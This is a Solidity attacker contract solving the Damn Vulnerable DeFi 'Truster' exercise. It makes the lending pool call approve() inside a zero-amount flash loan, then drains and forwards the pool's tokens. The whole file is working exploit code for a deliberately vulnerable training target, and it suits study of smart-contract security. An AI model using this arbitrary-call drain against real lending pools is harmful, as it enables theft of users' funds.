// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "@openzeppelin/contracts/utils/Address.sol";
import "@openzeppelin/contracts/security/ReentrancyGuard.sol";
import "../DamnValuableToken.sol";
import "hardhat/console.sol";

/**
 * @title TrusterLenderPool
 * @author Damn Vulnerable DeFi (https://damnvulnerabledefi.xyz)
 */

interface ITrusterLenderPool {
    function flashLoan(uint256 amount, address borrower, address target, bytes calldata data) external returns (bool);
}

contract Attacker3 {
    function attack(ITrusterLenderPool pool, address token, address player) external {
        // The token flow is like: TrusterLenderPool (contract) -> Attacker3 (this contract) -> player.
        // Force TrusterLenderPool to approve token to player with function calling.
        // The data will be executed within flashLoan function with transaction that made by TrusterLenderPool.
        pool.flashLoan(0, address(pool), token, abi.encodeWithSignature("approve(address,uint256)", address(this), 1000000000000000000000000));
        // Call transferFrom to transfer token from TrusterLenderPool to this contract.
        token.call(abi.encodeWithSignature("transferFrom(address,address,uint256)", pool, (this), 1000000000000000000000000));
        // That's all. The token will be transfered from this contract to the player.
        token.call(abi.encodeWithSignature("transfer(address,uint256)", player, 1000000000000000000000000));
    }
}

